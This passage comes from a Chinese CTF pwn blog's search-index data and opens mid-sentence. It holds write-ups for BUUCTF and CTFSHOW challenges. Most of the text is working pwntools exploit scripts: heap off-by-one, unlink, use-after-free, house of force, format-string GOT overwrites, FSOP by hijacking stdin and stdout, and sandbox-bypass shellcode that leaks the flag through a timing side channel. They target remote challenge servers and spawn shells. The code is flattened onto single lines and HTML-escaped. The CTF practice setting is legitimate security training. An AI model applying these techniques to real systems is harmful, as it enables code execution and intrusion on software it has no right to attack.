处。所以核心在于通过修改使堆块的fd指针指向利用的地址-16 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#p = process('./magicheap')p=remote('node4.buuoj.cn',26349)def CreateHeap(size,content): p.recvuntil(':') p.sendline('1') p.recvuntil(':') p.sendline(str(size)) p.recvuntil(':') p.sendline(content) def EditHeap(idx,size,content): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(idx)) p.recvuntil(':') p.sendline(str(size)) p.recvuntil(':') p.sendline(content) def DeleteHeap(idx): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(idx))CreateHeap(0x30,'aaaa')CreateHeap(0x80,'bbbb')CreateHeap(0x10,'cccc')DeleteHeap(1)#gdb.attach(p)magic = 0x6020A0EditHeap(0,0x50,0x30 * &quot;a&quot; + p64(0)+p64(0x91)+p64(0)+p64(magic-0x10))# 修改heap1的fd和bk指针#gdb.attach(p)CreateHeap(0x80,'dddd') #触发#gdb.attach(p)p.sendlineafter(':','4869')p.interactive() roarctf_2019_easy_pwn（off-by-one)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *r=remote('node4.buuoj.cn',26307)# r=process('roarctf_2019_easy_pwn')libc=ELF('./libc-2.23.so')context.log_level=&quot;debug&quot;def add(size): r.recvuntil('choice: ') r.sendline('1') r.recvuntil('size:') r.sendline(str(size))def edit(index,size,data): r.recvuntil('choice: ') r.sendline('2') r.recvuntil('index:') r.sendline(str(index)) r.recvuntil('size:') r.sendline(str(size)) r.recvuntil('content:') r.send(data) def delete(index): r.recvuntil('choice: ') r.sendline('3') r.recvuntil('index:') r.sendline(str(index)) def show(index): r.recvuntil('choice: ') r.sendline('4') r.recvuntil('index:') r.sendline(str(index)) malloc_hook=libc.symbols['__malloc_hook']realloc_hook=libc.symbols['realloc']print hex(malloc_hook)print hex(realloc_hook)#gdb.attach(r,&quot;b calloc&quot;)add(0x18)#idx0add(0x10)#idx1add(0x90)#idx2add(0x10)#idx3#gdb.attach(r)edit(0,34,'a'*0x10+p64(0x20)+p8(0xa1))#off by one #gdb.attach(r)edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))#by pass check #gdb.attach(r)delete(1)add(0x90)#idx1 chunk overlapedit(1,0x20,p64(0)*2+p64(0)+p64(0xa1))delete(2) show(1)r.recvuntil(&quot;content: &quot;)r.recv(0x20)libc_base=u64(r.recv(6).ljust(8,&quot;\\x00&quot;))-0x3c4b78print &quot;libc_base:&quot;+hex(libc_base)add(0x80)edit(1,0x90,p64(0)*2+p64(0)+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21))delete(2)edit(1,0x30,p64(0)*2+p64(0)+p64(0x71)+p64(malloc_hook+libc_base-0x23)*2)add(0x60)add(0x60)#idx4#gdb.attach(r)one_gadgets=[0x45216,0x4526a,0xf1147,0xf02a4]edit(4,27,'a'*11+p64(libc_base+one_gadgets[2])+p64(libc_base+realloc_hook+4)) add(0x60)r.interactive() hitcontraining_heapcreator(off-by-one) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *from LibcSearcher import LibcSearchersh=remote(&quot;node4.buuoj.cn&quot;,25982)# sh = process('./heapcreator')elf=ELF('./heapcreator')def create(length,value): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size of Heap : &quot;) sh.sendline(str(int(length))) sh.recvuntil(&quot;Content of heap:&quot;) sh.sendline(value)def edit(index,value): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(str(int(index))) sh.recvuntil(&quot;Content of heap : &quot;) sh.sendline(value)def show(index): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(str(int(index)))def delete(index): sh.recvuntil('Your choice :') sh.sendline('4') sh.recvuntil('Index :') sh.sendline(str(int(index)))create(0x18,'aaaa')create(0x10,'bbbb')create(0x10,'cccc')create(0x10,'/bin/sh')edit(0,'a'*0x18+'\\x81')delete(1)size = '\\x08'.ljust(8,'\\x00')payload = 'd'*0x40+ size + p64(elf.got['free'])create(0x70,payload)show(2)sh.recvuntil('Content : ')free_addr = u64(sh.recvuntil('Done')[:-5].ljust(8,'\\x00'))libc=LibcSearcher(&quot;free&quot;,free_addr)system_addr=free_addr+libc.dump(&quot;system&quot;)-libc.dump(&quot;free&quot;)edit(2,p64(system_addr))delete(3)sh.interactive() https://blog.csdn.net/weixin_45677731/article/details/107914807 hitcon2014_stkof(unlink)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *# sh=remote(&quot;node4.buuoj.cn&quot;,28995)sh=process(&quot;./stkof&quot;)context.log_level='debug'elf=ELF('./stkof')libc=ELF('./libc-2.23.so')puts_plt=elf.plt['puts']puts_got=elf.got['puts']free=elf.got['free']ptr=0x602150def alloc(size): sh.sendline('1') sh.sendline(str(size)) sh.recvuntil('OK\\n')def edit(idx, size, content): sh.sendline('2') sh.sendline(str(idx)) sh.sendline(str(size)) sh.send(content) sh.recvuntil('OK\\n')def delete(idx): sh.sendline('3') sh.sendline(str(idx)) alloc(0x100)alloc(0x20)alloc(0x80)payload=p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)payload+=p64(0x20)+p64(0x90)edit(2,len(payload),payload)delete(3)sh.recvuntil('OK')payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(puts_got)edit(2,len(payload),payload)edit(1,8,p64(puts_plt))delete(3)base = u64(sh.recv(6).ljust(8,'\\x00'))-libc.symbols['puts']sh.recvuntil('OK')system_addr=base+libc.symbols['system']payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(ptr+0x10)+&quot;/bin/sh&quot;edit(2,len(payload),payload)edit(1,8,p64(system_addr))delete(3)sh.interactive() zctf2016_note2(unlink)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#coding=utf-8from pwn import *io = remote('node4.buuoj.cn',26179)# io = process(&quot;./note2&quot;)elf = ELF(&quot;./note2&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)#context.log_level = &quot;debug&quot;def new_note(size, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;)&quot;) io.sendline(str(size)) io.recvuntil(&quot;:&quot;) io.sendline(content)def show_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))def edit_note(index, choice, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index)) io.recvuntil(&quot;]&quot;) io.sendline(str(choice)) io.recvuntil(&quot;:&quot;) io.sendline(content)def delete_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))io.recvuntil(&quot;:&quot;)io.sendline(&quot;/bin/sh&quot;) #nameio.recvuntil(&quot;:&quot;)io.sendline(&quot;ddd&quot;)ptr_0 = 0x602120fake_fd = ptr_0 - 0x18fake_bk = ptr_0 - 0x10note0_content = &quot;\\x00&quot; * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)new_note(0x80, note0_content) #note0new_note(0x0, &quot;aa&quot;) #note1new_note(0x80, &quot;/bin/sh&quot;) #note2#gdb.attach(io)delete_note(1)note1_content = &quot;\\x00&quot; * 16 + p64(0xa0) + p64(0x90)new_note(0x0, note1_content)delete_note(2) #unlink#gdb.attach(io)# 泄漏libcfree_got = elf.got[&quot;free&quot;]payload = 0x18 * &quot;a&quot; + p64(free_got)#gdb.attach(io)edit_note(0, 1, payload)#gdb.attach(io)show_note(0)io.recvuntil(&quot;is &quot;)free_addr = u64(io.recv(6).ljust(8, &quot;\\x00&quot;))libc_addr = free_addr - libc.symbols[&quot;free&quot;]print(&quot;libc address: &quot; + hex(libc_addr))#get shellsystem_addr = libc_addr + libc.symbols[&quot;system&quot;]one_gadget = libc_addr + 0xf02a4edit_note(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address#io.sendlineafter('option---&gt;&gt;','/bin/sh\\x00')io.interactive() wdb_2018_1st_babyheap(unlink,uaf)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 26136)#r = process(&quot;./wdb_2018_1st_babyheap&quot;)context(log_level = 'debug', arch = 'amd64', os = 'linux')DEBUG = 0if DEBUG: gdb.attach(r, ''' b *0x400CF7 x/10gx 0x602060 c ''')elf = ELF(&quot;./wdb_2018_1st_babyheap&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]bss_arr = 0x602060read_got = elf.got['read']menu = &quot;Choice:&quot;def add(index, content): r.recvuntil(menu) r.sendline('1') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index)) r.recvuntil(&quot;Content:&quot;) r.send(content)def delete(index): r.recvuntil(menu) r.sendline('4') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index))def edit(index, content): r.recvuntil(menu) r.sendline('2') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index)) r.recvuntil(&quot;Content:&quot;) r.send(content)def show(index): r.recvuntil(menu) r.sendline('3') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index))sleep(3)add(0, (p64(0)+p64(0x31))*2)add(1, 'aaa\\n')add(2, 'aaa\\n')add(3, 'aaa\\n')add(4, '/bin/sh\\n')delete(0)delete(1)delete(0)show(0)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00')) - 0x30success(&quot;heap:&quot;+hex(heap))edit(0, p64(heap+0x10)+'\\n')add(5, p64(0) + p64(0x31) + p64(heap) + p64(bss_arr-0x10))payload = p64(bss_arr-0x18) + p64(bss_arr-0x10) + p64(0x20) + p64(0x90)add(6, payload)add(7, p64(0) + p64(0x21) + p64(bss_arr-0x18) + p64(bss_arr-0x10))delete(1)show(6)malloc_hook = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10libc.address = malloc_hook - libc.sym['__malloc_hook']success(&quot;libc;&quot;+hex(libc.address))system = libc.symbols['system']free_hook = libc.sym['__free_hook']edit(0, p64(0)*3+p64(free_hook))edit(0, p64(system)+'\\n')delete(4)r.interactive() axb_2019_fmt64（64位格式化字符串改got表）12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level = 'debug'# io = remote('node4.buuoj.cn',29964)io = process('axb_2019_fmt64')elf = ELF('./axb_2019_fmt64')#libc = elf.libclibc = ELF('./libc-2.23.so')one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]sprintf_got = elf.got['sprintf']payload = '%9$saaaa'payload += p64(sprintf_got)io.recvuntil(&quot;Please tell me:&quot;)io.sendline(payload)sprintf_addr = u64(io.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))print &quot;sprintf_addr:&quot;+hex(sprintf_addr)libcbase = sprintf_addr - libc.symbols['sprintf']one_gadget = libcbase + one_gadget[0]print &quot;one_gadget:&quot;+hex(one_gadget)payload = ''payload += '%' + str((one_gadget % 0x10000) - 9) + 'c%12$hn'payload += '%' + str(((one_gadget &gt;&gt; 16) % 0x10000) - (one_gadget % 0x10000)) + 'c%13$hn'payload = payload.ljust(0x20,'\\x00')payload += p64(sprintf_got) + p64(sprintf_got + 2)print 'payload:'+payloadio.sendline(payload)io.interactive() pwnable_asm（沙箱)sandbox概述沙盒机制也就是我们常说的沙箱，英文名sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。 在ctf比赛中，pwn题中的沙盒一般都会限制execve的系统调用，这样一来one_gadget和system调用都不好使，只能采取open/read/write的组合方式来读取flag。一般有两种函数调用方式实现沙盒机制，第一种是采用prctl函数调用，第二种是使用seccomp库函数。 使用seccomp-tools检查沙盒机制，可以看到先是判断了体系架构是否是x86_64的，然后对系统调用号进行了判断，只允许了read/write/open/exit四种系统调用。 EXP12345678910111213141516171819#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = &quot;debug&quot;context.arch = 'amd64'context.os = 'linux'sh = remote(&quot;node4.buuoj.cn&quot;,&quot;26693&quot;)# sh = process('./asm')shellcode = shellcraft.pushstr(&quot;flag&quot;)shellcode += shellcraft.open(&quot;rsp&quot;)shellcode += shellcraft.read('rax', 'rsp', 100)shellcode += shellcraft.write(1, 'rsp', 100)sh.sendlineafter(&quot;shellcode: &quot;, asm(shellcode))print sh.recvall()sh.close() 参考文章：https://blog.csdn.net/A951860555/article/details/116738676 bctf2016_bcloud(house of force)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#coding:utf8from pwn import *from LibcSearcher import * #house of forcesh = process('./bcloud')# sh = remote('node4.buuoj.cn',28752)elf = ELF('./bcloud')puts_plt = elf.plt['puts']puts_got = elf.got['puts']free_got = elf.got['free']heap_array_addr = 0x0804B120sh.sendafter('Input your name:','a'*0x40)sh.recvuntil('a'*0x40)heap_addr = u32(sh.recv(4))print 'heap_addr=',hex(heap_addr)sh.sendafter('Org:','a'*0x40)#修改top chunk的sizesh.sendlineafter('Host:',p32(0xFFFFFFFF))top_chunk_addr = heap_addr + 0xD0print 'top_chunk_addr=',hex(top_chunk_addr) def add(size,content): sh.sendlineafter('option---&gt;&gt;','1') sh.sendlineafter('Input the length of the note content:',str(size)) sh.sendafter('Input the content:',content) def edit(index,content): sh.sendlineafter('option---&gt;&gt;','3') sh.sendlineafter('Input the id:',str(index)) sh.sendafter('Input the new content:',content) def delete(index): sh.sendlineafter('option---&gt;&gt;','4') sh.sendlineafter('Input the id:',str(index))offset = heap_array_addr - top_chunk_addr - 0x10add(offset,'') #0#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了add(0x18,'\\n') #1 #修改heap_arrayedit(1,p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + '/bin/sh\\x00')#修改free的got表为puts的plt表edit(1,p32(puts_plt) + '\\n')#泄露puts的地址delete(2)sh.recv(1)puts_addr = u32(sh.recv(4))libc = LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')system_addr = libc_base + libc.dump('system')print 'libc_base=',hex(libc_base)print 'system_addr=',hex(system_addr)#修改free的got表为system地址edit(1,p32(system_addr) + '\\n')#getshelldelete(3) sh.interactive() 参考文章 https://snappyjack.github.io/articles/2019-12/BCTF2016_bcloud https://blog.csdn.net/csdn546229768/article/details/122725993","link":"/2022/02/18/BUUCTF%20Pwn%20Exercise/"},{"title":"gyctf_2020_force","text":"house of force,realloc调整栈帧 思路house of force改top chunk，劫持malloc_hook为one_gadget拿shell EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *# r = remote(&quot;node4.buuoj.cn&quot;, 26964)r = process(&quot;./gyctf_2020_force&quot;)context.log_level = 'debug'elf = ELF(&quot;./gyctf_2020_force&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]def add(size, content): r.recvuntil(&quot;2:puts\\n&quot;) r.sendline('1') r.recvuntil(&quot;size\\n&quot;) r.sendline(str(size)) r.recvuntil(&quot;bin addr &quot;) addr = int(r.recvuntil('\\n').strip(), 16) r.recvuntil(&quot;content\\n&quot;) r.send(content) return addrdef show(index): r.recvuntil(&quot;2:puts\\n&quot;) r.sendline('2')libc.address = add(0x200000, 'chunk0\\n') + 0x200ff0success('libc_base'+hex(libc.address))heap_addr = add(0x18, 'a'*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF))success(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10# gdb.attach(r)malloc_hook = libc.sym['__malloc_hook']success(&quot;malloc_hook&quot;+hex(malloc_hook))one_gadget = one_gadget_16[1] + libc.addressrealloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym['system']bin_sh = libc.search('/bin/sh').next()success(&quot;system:&quot; + hex(system))success(&quot;bin_sh&quot; + hex(bin_sh))add(offset-0x30, 'aaa\\n')add(0x10, 'a'*8+p64(one_gadget)+p64(realloc+0x10))r.recvuntil(&quot;2:puts\\n&quot;)r.sendline('1')r.recvuntil(&quot;size\\n&quot;)r.sendline(str(20))r.interactive()","link":"/2022/02/27/gyctf_2020_force/"},{"title":"CTFSHOW卷王杯-pwn","text":"根据官方wp学习了两道好题 check in思路发现开了**sandbox**（之后再仔细分析），然后读入姓名那里有一个明显的格式化字符串漏洞，再之后可以读入0x90大小的数据，然而数组大小只有0x80，很明显是一个栈溢出，但是溢出的长度非常短，只有0x10，也就是只能覆盖rbp和ret，在程序的最后有close(1)关闭了标准输出的文件描述符，也就是我们无法泄露任何信息，包括最终得到的flag，最后再看下此题的保护：没有开**Canary**和**PIE**保护。 首先，格式化字符串的利用方式很显然，可以用于泄露**libc**：通过泄露__libc_start_main + 243，即可得到libc_base。 再来看栈溢出该如何利用，既然我们只能覆盖到rbp和ret，其中ret是跳转执行的地址，那么就可以考虑何处受rbp控制，又方便我们利用，不难想到read的时候，是将0x90的数据读到栈上的，而栈上的地址就受rbp控制，由汇编： 123450x4013dd &lt;main+163&gt;: lea rax,[rbp-0x80]0x4013e1 &lt;main+167&gt;: mov edx,0x900x4013e6 &lt;main+172&gt;: mov rsi,rax0x4013e9 &lt;main+175&gt;: mov edi,0x00x4013ee &lt;main+180&gt;: call 0x401100 &lt;read@plt&gt; 可见，read的第二个参数rsi（写入数据的地址）就是rbp-0x80中的内容，因此，我们可以通过控制**rbp**为**bss**段上的某地址，然后再通过**ret**跳转到**0x4013dd**的位置，即可往**bss**段上写入内容，再之后通过一个栈迁移，即可跳转到我们读到bss段上的gadget并执行。 最后，我们来看一下这个sandbox，是个黑名单，禁用socket那些主要就是为了防止重启输出流造成非预期的，可以先不用管，主要就是发现禁用了open的系统调用和read相关的系统调用，虽然没有禁write相关的系统调用，但是由于有close(1)，所以也无法输出，这看似是无法orw了，不过仔细分析后可以发现：open的系统调用虽然被禁用了，但是我们可以用**openat**系统调用来代替**open**系统调用（libc中的open函数就是对openat这个底层系统调用的封装），openat分绝对路径和相对路径两种写法，exp中都给出了；再来看read，注意到read相关的系统调用并非全部被禁用了，当read的fd为0时，read是可用的，对于常规orw来说，先open一个文件，由于0,1,2都分别被标准输入，输出，报错给占用了，所以文件描述符是从3开始的，而若是我们在open前，先**close(0)**，再**open**的话，我们打开的文件的描述符就是**0**了，我们也就可以**read**读取文件内容了；最后，对于write来说，可以采用“侧信道攻击”的方式，就是对flag的每一位进行爆破，与我们已经read读入到内存中的真实flag进行比对，比如，若是相等就触发死循环，那么我们就可以通过判断接收数据用了多久来判断猜测是否正确了，在当前假设下，若是超过了1秒，则说明我们这一位爆破猜测成功了，当然，我这里写了一个“二分法”的版本，不然会耗费很长时间（其实，CTFshow的flag好像用的是uuid字符串，也就是{}中的内容仅局限于-0123456789abcdef这几个字符，因此，应该还能进一步缩短我exp的爆破时长）。由于“侧信道攻击”最好使用shellcode来实现，故在之前需要用mprotect的gadget链改一下bss段的可执行权限，而一次性只能读入0x80大小的数据，可能无法将orw的shellcode和mprotect的gadget一起读进bss段，因此，我们可以先写一小段**shellcode**作为跳板和mprotect的gadget一起读入到bss段，再通过这个跳板，将orw的shellcode读到bss段上并跳转执行 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *context(os = &quot;linux&quot;, arch = &quot;amd64&quot;)possible_list = &quot;-0123456789abcdefghijklmnopqrstuvwxyz{}&quot;elf = ELF(&quot;./checkin&quot;)libc = ELF('./libc-2.30.so')bss_addr = elf.bss() + 0x500read_addr = 0x4013DDleave_addr = 0x401402def pwn(pos, char): io.sendlineafter(b&quot;name :\\n&quot;, b'%25$p') io.recvuntil(b&quot;Hello, &quot;) libc_base = int(io.recv(14)[2:], 16) - 243 - libc.sym['__libc_start_main'] payload = b'\\x00'*0x80 + p64(bss_addr + 0x80) + p64(read_addr) io.sendafter(b&quot;check in :\\n&quot;, payload) shellcode_read = f''' xor rax, rax xor rdi, rdi push {bss_addr+0x100} pop rsi push 0x100 pop rdx syscall jmp rsi ''' pop_rdi_ret = libc_base + 0x26bb2 pop_rsi_ret = libc_base + 0x2709c pop_rdx_r12_ret = libc_base + 0x11c421 mprotect_addr = libc_base + libc.sym['mprotect'] payload = p64(pop_rdi_ret) + p64(bss_addr &amp; 0xfffff000) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0) + p64(mprotect_addr) payload += p64(bss_addr + len(payload) + 8) + asm(shellcode_read) payload = payload.ljust(0x80, b'\\x00') + p64(bss_addr - 8) + p64(leave_addr) sleep(0.1) io.send(payload) shellcode_main = f''' /* close(0) */ push 3 pop rax xor rdi, rdi syscall /* openat(&quot;/flag&quot;) */ push 257 pop rax /* ( absolute path ) */ mov rsi, 0x67616c662f push rsi mov rsi, rsp /* ( relative path ) push -100 pop rdi push 0x67616c66 push rsp pop rsi */ syscall /* read flag */ xor rax, rax xor rdi, rdi mov rsi, rsp push 0x50 pop rdx syscall /* blow up flag */ mov al, byte ptr[rsi+{pos}] cmp al, {char} ja $-2 ret ''' sleep(0.1) io.send(asm(shellcode_main))if __name__ == '__main__' : start = time.time() pos = 0 flag = &quot;&quot; while True: left, right = 0, len(possible_list)-1 while left &lt; right : mid = (left + right) &gt;&gt; 1 io = remote(&quot;pwn.challenge.ctf.show&quot;, 28102) pwn(pos, ord(possible_list[mid])) s = time.time() io.recv(timeout = 1) t = time.time() io.close() if t - s &gt; 1 : left = mid + 1 else : right = mid flag += possible_list[left] info(flag) if possible_list[left] == '}' : break pos = pos + 1 success(flag) end = time.time() success(&quot;time:\\t&quot; + str(end - start) + &quot;s&quot;) Incomplete Menu思路这题给出了一个不完整的菜单，只有new和edit，new就是新建一个任意大小（无限制）的堆块，最多只可以创建5个堆块，edit可以输入需要读进某堆块中内容的长度len，如果输入的长度len超过了该堆块的大小size，则实际读入长度Len = size，否则Len = len。漏洞点在于：在将读入内容的最后一字节改为\\x00的时候，长度用的是用户输入的长度len，而并非实际读入的长度Len，这样就会导致某堆块后面的任意某字节会被“刷零”，不过每个堆块只能被edit一次。 没有show，不能泄露信息，不过有走IO流输出的函数，如puts和printf，因此容易想到通过劫持stdout来进行信息泄露，没有delete函数，不能对堆块进行free，其实可以通过漏洞改top chunk的size，将它改小以后（要保证后三位不动），再申请一个大堆块，就能将原先的top chunk给free调了，不过在这里貌似并没有太大的用处。 我们只有这一个可利用的漏洞，又需要劫持到stdout，那就需要知道stdout与堆块地址的偏移，对于一般的堆块，其地址与libc地址的偏移肯定是无法确定的，但是这题可以申请任意大的堆块，也就是可以通过mmap申请堆块，而**mmap**申请出来的堆块，是紧接在**libc**的上方的，其地址与**libc**中地址的偏移是可以确定的，这里可以通过将**_IO_2_1_stdout_**的**_IO_read_end**和**_IO_write_base**的最后一字节都改为**\\x00**，这样他们就相等了，也就可以通过走IO的输出函数泄露出其中（_IO_write_base ~ _IO_write_ptr）包含的libc地址，进而得到libc_base。 泄露出libc_base之后，我们肯定是需要一个“任意写”漏洞，劫持一些函数或者IO流这些才能完成攻击。不难想到，可以通过劫持stdin来实现，这里我们按照和上面类似的方式，修改**_IO_2_1_stdin_**的**_IO_buf_base**中的最后一字节为**\\x00**，这时，_IO_buf_base正好指向了_IO_2_1_stdin_，而我们读入的时候，用的是fgets，这是一个走IO流的读入函数（这个函数就是读一整行到stdin缓冲区，然后再从缓冲区取出指定长度的数据，因此读数据会被\\n截断，或者已经从缓冲区取到了所需长度的数据，也不再会刷新缓冲区往后读取数据了），因此，我们可以通过fgets读入任意内容到被伪造的_IO_buf_base（_IO_2_1_stdin_）处，这样就可以再劫持一次stdin进行任意写了，我们读入多少字节到缓冲区，_IO_read_end就会相应加多少，从缓冲区读取多少字节到目标内存，_IO_read_ptr就会相应加多少，不过，最多也只能一次性读入_IO_buf_end - _IO_buf_base大小的数据到缓冲区，如果还需要读入，则会刷新缓冲区，一次也最多只能读取_IO_read_end - _IO_read_ptr大小的合法数据到目标内存，此时，由于_IO_buf_end为_IO_buf_base + 132，因此，我们只有读满**132**个字节，才有机会按我们第一次劫持**stdin**后，读入到**_IO_buf_base**中的值（记为**_IO_buf_base(new)**）刷新缓冲区，只有刷新完缓冲区之后，才能按照我们的设想进行第二次**stdin**的劫持。这里需要注意的是，在第一次完成stdin的劫持，读入132字节的内容到_IO_2_1_stdin_中之后，会尝试从缓冲区取16个字节到目标内存，如果成功取出了16个字节，也就满足了fgets的需要，那么也就不会刷新缓冲区了，我们也就不能对stdin进行第二次劫持了。在这里，glibc是通过判断**_IO_read_ptr**是否小于**_IO_read_end**来判断缓冲区中是否还有剩余的数据，因此，我们可以在第一次劫持stdin往_IO_2_1_stdin_中写内容的时候，修改其中的**_IO_read_ptr**等于**_IO_read_end**，这里的_IO_read_end是指读完132个字节后的值（_IO_buf_base(new) + 132），也就是需要_IO_read_ptr = _IO_buf_base(new) + 132，其实，这里也不一定是要加上132，略小一点，只要保证和_IO_read_end差值不足大约16个字节，可以有刷新缓冲区的机会即可，并且，glibc源码中也只是判断了_IO_read_ptr是否小于_IO_read_end，故还可以将_IO_read_ptr改为大于_IO_read_end，比如_IO_read_ptr = _IO_buf_base(new) + 200也行。在这里，我是通过劫持**IO_list_all**来打**FSOP**的，通过读取choice的fgets进行“任意写”以后，由于获取到的值并非菜单中的选项1或2，就会走到exit，直接触发FSOP。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context(arch='amd64', log_level='debug')io = remote(&quot;pwn.challenge.ctf.show&quot;,28121)# io = process('./pwn')elf = ELF('./pwn')libc = ELF(&quot;./libc-2.27.so&quot;)def get_IO_str_jumps(): IO_file_jumps_offset = libc.sym['_IO_file_jumps'] IO_str_underflow_offset = libc.sym['_IO_str_underflow'] for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: return possible_IO_str_jumps_offsetdef new(size): io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;) io.sendlineafter(&quot;&gt;&gt; &quot;, str(size))def edit(index, length, content): io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;2&quot;) io.sendlineafter(&quot;&gt;&gt; &quot;, str(index)) io.sendlineafter(&quot;&gt;&gt; &quot;, str(length)) io.sendafter(&quot;&gt;&gt; &quot;, content)def new_x(size): io.sendline(&quot;1&quot;) sleep(0.1) io.sendline(str(size))def edit_x(index, length, content): io.sendline(&quot;2&quot;) sleep(0.1) io.sendline(str(index)) sleep(0.1) io.sendline(str(length)) sleep(0.1) io.send(content)new(0x200000);edit(0, 0x201000 - 0x10 + libc.sym['_IO_2_1_stdout_'] + 0x10 + 1, '\\n') # _IO_read_endnew_x(0x200000);edit_x(1, 0x201000 * 2 - 0x10 + libc.sym['_IO_2_1_stdout_'] + 0x20 + 1, '\\n') # _IO_write_baselibc_base = u64(io.recvline()[8:16]) - libc.sym['__free_hook'] + 0x38 # _IO_stdfile_2_lock (_IO_2_1_stderr_.file._lock)success(&quot;libc_base:\\t&quot; + hex(libc_base))payload = p64(0)*5 + p64(1) + p64(0) + p64(libc_base + next(libc.search(b'/bin/sh')))payload = payload.ljust(0xd8, b'\\x00') + p64(libc_base + get_IO_str_jumps() - 8)payload += p64(0) + p64(libc_base + libc.sym['system'])new(0x200000);edit(2, 0x201000 * 3 - 0x10 + libc.sym['_IO_2_1_stdin_'] + 0x38 + 1, payload) # _IO_buf_basepayload = p64(0xfbad208b) # _flagspayload += p64(libc_base + libc.sym['_IO_list_all'] + 132) # _IO_read_ptrpayload += p64(libc_base + libc.sym['_IO_list_all']) * 6payload += p64(libc_base + libc.sym['_IO_list_all'] + 0x10) # _IO_buf_endpayload = payload.ljust(132, b'\\x00') + p64(libc_base - (0x201000 * 3 - 0x10))io.sendlineafter(&quot;&gt;&gt; &quot;, payload)io.interactive() 参考ctfshow卷王杯官方wp","link":"/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"}],"tags":[{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"leetcode","slug":"leetcode","link":"/tags/leetcode/"},{"name":"Kernel","slug":"Kernel","link":"/tags/Kernel/"},{"name":"flask","slug":"flask","link":"/tags/flask/"},{"name":"数据结构","slug":"数据结构","link":"/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"categories":[{"name":"pwn","slug":"pwn","link":"/categories/pwn/"},{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"leetcode","slug":"leetcode","link":"/categories/leetcode/"},{"name":"pwnable.tw","slug":"pwnable-tw","link":"/categories/pwnable-tw/"},{"name":"Kernel","slug":"Kernel","link":"/categories/Kernel/"},{"name":"flask","slug":"flask","link":"/categories/flask/"},{"name":"数据结构","slug":"数据结构","link":"/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]}